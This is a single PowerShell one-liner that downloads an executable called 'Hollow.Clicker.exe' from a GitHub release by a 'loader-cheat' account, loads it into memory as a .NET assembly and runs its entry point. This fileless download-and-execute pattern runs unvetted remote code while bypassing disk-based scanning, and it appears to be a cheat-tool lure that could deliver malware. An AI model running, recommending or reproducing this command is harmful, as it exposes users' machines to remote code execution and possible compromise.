[System.Reflection.Assembly]::Load((Invoke-WebRequest "https://github.com/loader-cheat/Hollow-Clicker-Public/releases/download/Patch/Hollow.Clicker.exe").Content).EntryPoint.Invoke($null, $null)
